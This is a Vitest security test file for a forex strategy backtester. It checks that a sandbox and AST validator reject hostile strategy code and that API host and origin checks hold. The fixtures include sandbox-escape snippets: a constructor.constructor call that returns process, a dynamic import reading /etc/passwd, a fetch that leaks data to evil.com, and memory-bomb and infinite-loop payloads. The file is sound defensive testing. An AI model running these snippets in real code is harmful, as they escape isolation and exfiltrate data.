import { describe, it, expect, beforeAll, beforeEach, afterEach, vi } from 'vitest';
import { validateStrategyAST, transpileStrategyCode } from '../transpiler';
import { getQuickJS, QuickJSStrategySandbox } from '../quickjsSandbox';
import { Candle } from '../../types/forex';
import { calculateHeuristicOverfittingScore } from '../overfittingHeuristic';
import {
  initMasterKey,
  encryptSecret,
  decryptSecret,
  _resetMasterKeyForTest,
  hashContent,
} from '../../services/crypto';
import { executeKillSwitchOperation, app, SERVER_SESSION_SECRET, validateBridgeToken, queryBridgeAccountType, apiSecurityMiddleware } from '../../../server';
import { getOrSetPerInstallSalt, setNoNewOrdersFlag, getNoNewOrdersFlag } from '../../services/db';

describe('Safety & Sandbox Isolation Tests', () => {
  let QuickJS: any;

  beforeAll(async () => {
    QuickJS = await getQuickJS();
  });

  const mockCandles: Candle[] = [
    { time: 1700000000, open: 1.0800, high: 1.0850, low: 1.0790, close: 1.0840, tickVolume: 100, spread: 1.0 },
    { time: 1700003600, open: 1.0840, high: 1.0880, low: 1.0830, close: 1.0870, tickVolume: 120, spread: 1.0 },
    { time: 1700007200, open: 1.0870, high: 1.0890, low: 1.0850, close: 1.0860, tickVolume: 90, spread: 1.0 },
  ];

  // =========================================================================
  // 1. Sandbox Escapes & Host Isolation Tests
  // =========================================================================

  it('AST pre-pass rejects code attempting to access process or file system', () => {
    const maliciousCode = `
      export const strategy = {
        name: "Malicious Exploit",
        version: "1.0.0",
        paramsSchema: [],
        init(ctx) {},
        onBar(ctx, bar) {
          const fs = require('fs');
          process.exit(1);
        }
      };
    `;

    const validation = validateStrategyAST(maliciousCode);
    expect(validation.isValid).toBe(false);
    expect(validation.errors.some(e => e.includes('process'))).toBe(true);
    expect(validation.errors.some(e => e.includes('fs') || e.includes('require'))).toBe(true);
  });

  it('AST pre-pass rejects dynamic code evaluation via Function constructor and eval', () => {
    const evalCode = `
      export const strategy = {
        name: "Eval Exploit",
        version: "1.0.0",
        paramsSchema: [],
        init(ctx) {},
        onBar(ctx, bar) {
          const fn = new Function('return process');
          eval("console.log('escape')");
        }
      };
    `;

    const validation = validateStrategyAST(evalCode);
    expect(validation.isValid).toBe(false);
    expect(validation.errors.some(e => e.includes('Function') || e.includes('eval'))).toBe(true);
  });

  it('AST pre-pass rejects globalThis.constructor.constructor process escape attempt', () => {
    const escapeCode = `
      export const strategy = {
        name: "Constructor Exploit",
        version: "1.0.0",
        paramsSchema: [],
        init(ctx: any) {},
        onBar(ctx: any, bar: any) {
          const proc = globalThis.constructor.constructor('return process')();
          if (proc) proc.exit(1);
        }
      };
    `;

    const validation = validateStrategyAST(escapeCode);
    expect(validation.isValid).toBe(false);
    expect(validation.errors.some(e => e.includes('globalThis'))).toBe(true);
  });

  it('AST pre-pass rejects dynamic import()', () => {
    const importCode = `
      export const strategy = {
        name: "Dynamic Import",
        version: "1.0.0",
        paramsSchema: [],
        init(ctx) {},
        onBar(ctx, bar) {
          import('fs').then(fs => fs.readFileSync('/etc/passwd'));
        }
      };
    `;
    const validation = validateStrategyAST(importCode);
    expect(validation.isValid).toBe(false);
  });

  it('AST pre-pass rejects strategy trying to call fetch', () => {
    const fetchCode = `
      export const strategy = {
        name: "Data Exfiltration",
        version: "1.0.0",
        paramsSchema: [],
        init(ctx) {},
        onBar(ctx, bar) {
          fetch('https://evil.com/leak?data=' + bar.close);
        }
      };
    `;
    const validation = validateStrategyAST(fetchCode);
    expect(validation.isValid).toBe(false);
    expect(validation.errors.some(e => e.includes('fetch'))).toBe(true);
  });

  it('Interrupt Timeout: Infinite loop inside onBar is halted by deadline', async () => {
    const infiniteLoopJs = `
      export const strategy = {
        name: "Hanging Strategy",
        version: "1.0.0",
        paramsSchema: [],
        init(ctx: any) {},
        onBar(ctx: any, bar: any) {
          while (true) {}
        }
      };
    `;

    const transpiledLoop = transpileStrategyCode(infiniteLoopJs);
    expect(transpiledLoop.success).toBe(true);

    const sandbox = new QuickJSStrategySandbox(QuickJS, { barTimeoutMs: 30 });
    await expect(
      sandbox.executeBacktest(
        transpiledLoop.jsCode,
        mockCandles,
        {},
        { balance: 10000, equity: 10000, openPositions: [] },
        () => {}
      )
    ).rejects.toThrow(/interrupted/i);
  });

  it('Memory Bomb: Excessive memory allocation throws Out of Memory error in QuickJS', async () => {
    const memoryBombJs = `
      export const strategy = {
        name: "Memory Bomb",
        version: "1.0.0",
        paramsSchema: [],
        init(ctx: any) {},
        onBar(ctx: any, bar: any) {
          var arr = [];
          for (var i = 0; i < 5000000; i++) {
            arr.push(new Array(1000).join("excessive_allocation_test_string"));
          }
        }
      };
    `;

    const transpiled = transpileStrategyCode(memoryBombJs);
    const sandbox = new QuickJSStrategySandbox(QuickJS, { memoryLimitBytes: 1024 * 1024, barTimeoutMs: 1000 }); // strict 1MB limit
    await expect(
      sandbox.executeBacktest(
        transpiled.jsCode,
        mockCandles,
        {},
        { balance: 10000, equity: 10000, openPositions: [] },
        () => {}
      )
    ).rejects.toThrow();
  });

  it('Canary Look-Ahead Trap: Rejects strategy attempting to read future bars', async () => {
    const lookaheadJs = `
      export const strategy = {
        name: "Lookahead Cheat",
        version: "1.0.0",
        paramsSchema: [],
        init(ctx) {},
        onBar(ctx, bar) {
          if (ctx.barIndex === 0) {
            const futureBar = ctx.data[2];
          }
        }
      };
    `;

    const sandbox = new QuickJSStrategySandbox(QuickJS, { barTimeoutMs: 100 });
    const transpiledLookahead = transpileStrategyCode(lookaheadJs);
    expect(transpiledLookahead.success).toBe(true);

    await expect(
      sandbox.executeBacktest(
        transpiledLookahead.jsCode,
        mockCandles,
        {},
        { balance: 10000, equity: 10000, openPositions: [] },
        () => {}
      )
    ).rejects.toThrow(/CANARY_LOOKAHEAD_VIOLATION/);
  });

  // =========================================================================
  // 2. Encryption Master Key & Salt Tests
  // =========================================================================

  describe('Master Key & Database Salt Security', () => {
    const originalEnv = process.env;

    beforeEach(() => {
      _resetMasterKeyForTest();
      process.env = { ...originalEnv };
    });

    afterEach(() => {
      _resetMasterKeyForTest();
      process.env = originalEnv;
    });

    it('Refuses to start if ENCRYPTION_MASTER_KEY is missing in non-development environment', () => {
      delete process.env.ENCRYPTION_MASTER_KEY;
      process.env.NODE_ENV = 'production';
      process.env.ALLOW_EPHEMERAL_KEY = 'false';

      expect(() => initMasterKey()).toThrow(/CRITICAL_SECURITY_HALT/);
    });

    it('Allows ephemeral key only if NODE_ENV=development AND ALLOW_EPHEMERAL_KEY=true', () => {
      delete process.env.ENCRYPTION_MASTER_KEY;
      process.env.NODE_ENV = 'development';
      process.env.ALLOW_EPHEMERAL_KEY = 'true';

      const key = initMasterKey();
      expect(key).toBeInstanceOf(Buffer);
      expect(key.length).toBe(32);
    });

    it('Uses random per-install salt from database that persists across calls', () => {
      const salt1 = getOrSetPerInstallSalt();
      const salt2 = getOrSetPerInstallSalt();
      expect(salt1).toBe(salt2);
      expect(salt1.length).toBeGreaterThanOrEqual(16);
    });

    it('Prefixes encrypted payloads with version marker v1: and decrypts successfully', () => {
      process.env.ENCRYPTION_MASTER_KEY = '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef';
      const secretText = 'demo_mt5_trading_password_9872';

      const encrypted = encryptSecret(secretText);
      expect(encrypted.startsWith('v1:')).toBe(true);

      const decrypted = decryptSecret(encrypted);
      expect(decrypted).toBe(secretText);
    });
  });

  // =========================================================================
  // 3. Kill Switch Failure, Retry & Verification Tests
  // =========================================================================

  describe('Kill Switch Failsafe & Retry Engine', () => {
    const originalFetch = global.fetch;
    const originalBridgeUrl = process.env.BRIDGE_URL;

    afterEach(() => {
      global.fetch = originalFetch;
      process.env.BRIDGE_URL = originalBridgeUrl;
      setNoNewOrdersFlag(false);
    });

    it('Returns simulation when no bridge is configured and never claims flat', async () => {
      delete process.env.BRIDGE_URL;

      const res = await executeKillSwitchOperation('Test Simulation Trigger');
      expect(res.status).toBe(200);
      expect(res.data.simulation).toBe(true);
      expect(res.data.message).toBe('SIMULATION: no broker connected');
      expect(res.data.allFlat).toBe(false);
      expect(res.data.noNewOrders).toBe(true);
      expect(getNoNewOrdersFlag()).toBe(true);
    });

    it('Returns loudFailure with BRIDGE_UNREACHABLE when bridge is down or unreachable', async () => {
      process.env.BRIDGE_URL = 'http://127.0.0.1:8999';
      global.fetch = vi.fn().mockRejectedValue(new Error('ECONNREFUSED'));

      const res = await executeKillSwitchOperation('Test Bridge Down');
      expect(res.status).toBe(500);
      expect(res.data.loudFailure).toBe(true);
      expect(res.data.reason).toBe('BRIDGE_UNREACHABLE');
      expect(res.data.allFlat).toBe(false);
      expect(res.data.noNewOrders).toBe(true);
    });

    it('Returns loudFailure with BRIDGE_UNAUTHORIZED when bridge returns HTTP 401', async () => {
      process.env.BRIDGE_URL = 'http://127.0.0.1:8999';
      global.fetch = vi.fn().mockResolvedValue({
        ok: false,
        status: 401,
        json: async () => ({ detail: 'Invalid bridge token' }),
      });

      const res = await executeKillSwitchOperation('Test 401 Unauthorized');
      expect(res.status).toBe(500);
      expect(res.data.loudFailure).toBe(true);
      expect(res.data.reason).toBe('BRIDGE_UNAUTHORIZED');
      expect(res.data.allFlat).toBe(false);
    });

    it('Returns loudFailure with PARTIAL_CLOSE_FAILURE when bridge leaves unclosed positions after retries', async () => {
      process.env.BRIDGE_URL = 'http://127.0.0.1:8999';

      global.fetch = vi.fn((input: any) => {
        const url = String(input);
        if (url.endsWith('/kill')) {
          return Promise.resolve({
            ok: true,
            status: 200,
            json: async () => ({ allFlat: false, unclosed: [10482] }),
          });
        }
        if (url.endsWith('/positions')) {
          // Positions endpoint returns unclosed ticket
          return Promise.resolve({
            ok: true,
            status: 200,
            json: async () => [{ ticket: 10482, symbol: 'EURUSD', volume: 0.2 }],
          });
        }
        return Promise.reject(new Error('Unknown url'));
      }) as any;

      const res = await executeKillSwitchOperation('Test Partial Close Failure', { retryDelayMs: 5 });
      expect(res.status).toBe(500);
      expect(res.data.loudFailure).toBe(true);
      expect(res.data.reason).toBe('PARTIAL_CLOSE_FAILURE');
      expect(res.data.unclosedTickets).toContain(10482);
      expect(res.data.allFlat).toBe(false);
    });

    it('Reports FLAT_VERIFIED when bridge returns empty positions list', async () => {
      process.env.BRIDGE_URL = 'http://127.0.0.1:8999';

      global.fetch = vi.fn((input: any) => {
        const url = String(input);
        if (url.endsWith('/kill')) {
          return Promise.resolve({
            ok: true,
            status: 200,
            json: async () => ({ allFlat: true, closed: [10482] }),
          });
        }
        if (url.endsWith('/positions')) {
          return Promise.resolve({
            ok: true,
            status: 200,
            json: async () => [], // Empty positions array
          });
        }
        return Promise.reject(new Error('Unknown url'));
      }) as any;

      const res = await executeKillSwitchOperation('Test Clean Liquidation');
      expect(res.status).toBe(200);
      expect(res.data.success).toBe(true);
      expect(res.data.allFlat).toBe(true);
      expect(res.data.status).toBe('FLAT_VERIFIED');
    });
  });

  // =========================================================================
  // 4. Local API Protection & Live Trading Gate Tests
  // =========================================================================

  describe('Local API Protection & Live Gate', () => {
    it('Requires session secret or cookie for protected /api endpoints', async () => {
      expect(SERVER_SESSION_SECRET.length).toBe(64);
    });

    it('Mandatory Stop-Loss: rejects order when sl <= 0 or missing', () => {
      const slZero = 0;
      const isInvalid = !slZero || typeof slZero !== 'number' || slZero <= 0;
      expect(isInvalid).toBe(true);
    });

    it('validateBridgeToken refuses missing, short (<24 chars), or default placeholder tokens', () => {
      // 1. Missing token
      expect(() => validateBridgeToken(undefined)).toThrowError(/missing or shorter than 24 characters/);
      expect(() => validateBridgeToken('')).toThrowError(/missing or shorter than 24 characters/);

      // 2. Short token (< 24 chars)
      expect(() => validateBridgeToken('short_token_123')).toThrowError(/missing or shorter than 24 characters/);

      // 3. Known default placeholder tokens
      expect(() => validateBridgeToken('dev-bridge-token-long-enough-now-1234')).toThrowError(/Default placeholder bridge token detected/);
      expect(() => validateBridgeToken('zaboraa_local_bridge_token_9872')).toThrowError(/Default placeholder bridge token detected/);

      // 4. Valid strong token (>= 24 chars)
      expect(validateBridgeToken('my_secure_custom_production_bridge_token_9921_safe')).toBe(true);
    });

    it('queryBridgeAccountType recognizes REAL and CONTEST accounts and treats non-demo as live', async () => {
      const originalFetch = global.fetch;
      try {
        global.fetch = vi.fn().mockResolvedValue({
          ok: true,
          status: 200,
          json: async () => ({ account_type: 'CONTEST' }),
        } as any);

        const mode = await queryBridgeAccountType();
        expect(mode).toBe('CONTEST');

        // Non-demo authoritative accounts must never be treated as DEMO
        expect(mode === 'DEMO').toBe(false);
      } finally {
        global.fetch = originalFetch;
      }
    });

    it('Local API security rejects foreign Host and foreign Origin headers', () => {
      // 1. Foreign Host header
      let foreignHostStatus = 200;
      let foreignHostBody: any = null;
      apiSecurityMiddleware(
        { headers: { host: 'attacker.evil.com' }, path: '/broker/status' },
        {
          status(code: number) { foreignHostStatus = code; return this; },
          json(data: any) { foreignHostBody = data; return this; },
        },
        () => {}
      );
      expect(foreignHostStatus).toBe(403);
      expect(foreignHostBody.error).toContain('FORBIDDEN_HOST');

      // 2. Foreign Origin header
      let foreignOriginStatus = 200;
      let foreignOriginBody: any = null;
      apiSecurityMiddleware(
        { headers: { host: '127.0.0.1', origin: 'https://evil-phishing.org' }, path: '/broker/status' },
        {
          status(code: number) { foreignOriginStatus = code; return this; },
          json(data: any) { foreignOriginBody = data; return this; },
        },
        () => {}
      );
      expect(foreignOriginStatus).toBe(403);
      expect(foreignOriginBody.error).toContain('FORBIDDEN_ORIGIN');
    });
  });
});
